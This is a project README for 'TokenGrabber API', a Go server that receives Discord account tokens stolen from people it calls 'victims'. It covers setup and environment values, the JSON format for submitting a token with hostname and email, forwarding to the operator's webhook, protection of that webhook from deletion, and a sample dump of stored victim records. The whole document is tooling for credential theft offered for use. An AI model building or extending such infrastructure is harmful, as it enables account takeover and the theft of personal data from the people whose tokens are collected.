# TokenGrabber API

Simple REST API to protect your webhook

Code is ugly as hell ik

And please make issues if you have any suggestions
	
## Overview
	
* Protect your webhook from bein deleted
* Store your victims info into a database and access to it at any moment via an Endpoint
* Will automatically send a webhook message with all useful informations
* Will skip invalid tokens to prevent spamming
* Sorted by User ID's so no dupes.

	
## How can I make it work ?

### First 

edit the **.env** file with the values you want
```
WEBHOOK_URL=your webhook
PORT=:8080 # port you wanna use
AUTH_KEY=STRONGKEYNGL # To get all the users don't share it
```
 Open a terminal where the project is located, make sure to have Go installed and configured !
 Then run 
 ```
 go mod tidy
 ```
All dependencies should have been downloaded, Now you can run the go file or build it.
```
go run main.go
OR
go build
```

### Some Explainations 
The `/api/token` endpoint can accept different json requests, but the only important thing is that the `token` is provided
```go
type User struct {
	gorm.Model
	Hostname string `json:"hostname"`
	UID      string `json:"UID"`
	Token    string `json:"token"`
	Email    string `json:"email"`
}
```

```
{
    "token": "YOUR_TOKEN"
}
```

```
{
    "hostname": DESKTOP_GITHUB",
    "token": "YOUR_TOKEN"
}
```
Both jsons are valid and produce these results:

* No Hostname

![nohost](https://media.discordapp.net/attachments/870608841623085100/883086274666332190/Discord_OwzWOrjQk1.png)

* With Hostname

![host](https://media.discordapp.net/attachments/870608841623085100/883086271285719140/Discord_vWg722q0mQ.png)
 
You would like to get all the data from your users ? Make a GET request to the endpoint `/api/users` 

Note that you will need to pass in the **AUTH_KEY** you added in your .env file in the Authorization header.

And you will get a json array as a response
```
[
    {
        "ID": 1,
        "CreatedAt": "2021-09-02T21:58:05.3557696+02:00",
        "UpdatedAt": "2021-09-02T22:39:21.2634461+02:00",
        "DeletedAt": null,
        "hostname": "DESKTOP_GITHUB",
        "UID": "3455255633120462980026282",
        "token": "my_token",
        "email": "email@example.com"
    }
]
```

## TODO
* Improve anti-spamming solution
* MAKE THE CODE LOOK BETTER
* Add more info on user
